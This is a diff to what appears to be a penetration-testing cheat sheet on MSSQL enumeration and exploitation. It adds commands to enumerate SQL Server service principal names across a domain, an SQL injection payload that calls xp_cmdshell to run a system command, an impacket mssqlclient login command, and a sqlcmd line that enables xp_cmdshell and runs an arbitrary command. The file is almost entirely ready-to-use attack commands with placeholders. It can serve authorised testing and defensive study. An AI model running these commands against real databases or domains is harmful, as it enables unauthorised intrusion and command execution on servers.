@@ -1,9 +1,16 @@
-# Powershell setspn enumerate MSSQL Instances
+% MSSQL Enumeration & Exploitation
+
+# Enumerate SQL Server Service Principal Names across the domain using setspn
 setspn -T <Domain> -Q MSSQLSvc/*
 
-# GetUserSPNs to enumerate MSSQL Instances
+# Enumerate SQL SPNs using PowerShell (requires GetUserSPNs.ps1)
 . .\GetUserSPNs.ps1 -GCName <Domain>
 
+# Test SQL injection using xp_cmdshell to run a command (example: ping)
+test';EXEC master..xp_cmdshell 'ping <ip>'; --
 
-# xp_cmdshell SQL Injection Ping
-test';EXEC master.. xp_cmdshell 'ping <ip>'; --
+# Connect to a SQL Server using impacket-mssqlclient and execute commands
+python3 mssqlclient.py <domain>/<username>:<password>@<db-host> -windows-auth -encrypt
+
+# Enable xp_cmdshell and run a command using sqlcmd
+sqlcmd -E -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<command>';"
